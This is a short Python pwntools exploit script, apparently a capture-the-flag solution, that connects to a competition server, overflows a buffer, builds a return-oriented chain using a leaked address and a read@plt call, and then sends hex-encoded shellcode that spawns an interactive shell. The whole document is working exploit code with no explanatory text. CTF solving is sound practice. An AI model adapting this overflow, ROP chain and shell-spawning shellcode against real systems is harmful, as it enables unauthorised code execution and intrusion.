from pwn import *

p = remote("hax1.allesctf.net",9300)

start = int(p.readline().split()[3],16)

input() # delay the script to start gdb

popRSI = start + 0x0000000000001351
new_buf = start 	# we just use the text section start as the buffer
read_plt = start + 0x1040


p.sendline(b"A" * cyclic_find(b'gaaa') + p64(popRSI) +
						p64(new_buf) + p64(0) + p64(read_plt) + p64(start))
input()
p.sendline(bytes.fromhex("31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05"));


p.interactive()
